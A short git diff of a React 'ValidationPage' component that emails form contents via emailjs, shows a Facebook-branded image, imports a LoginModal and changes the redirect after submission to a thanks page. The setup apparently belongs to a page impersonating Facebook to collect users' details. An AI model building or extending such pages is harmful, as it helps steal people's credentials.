@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import emailjs from "@emailjs/browser";
 import FacebookVideo from "../assets/fbVideo.png";
 import "./style.css";
+import LoginModal from "../modal/LoginModal";
 
 const ValidationPage = () => {
   const form = useRef();
@@ -33,7 +34,7 @@ const ValidationPage = () => {
         .then(
           (result) => {
             console.log("result text is", result.text);
-            navigate("/modal/LoginModal");
+            navigate("/thanks");
           },
           (error) => {
             console.log(error.text);
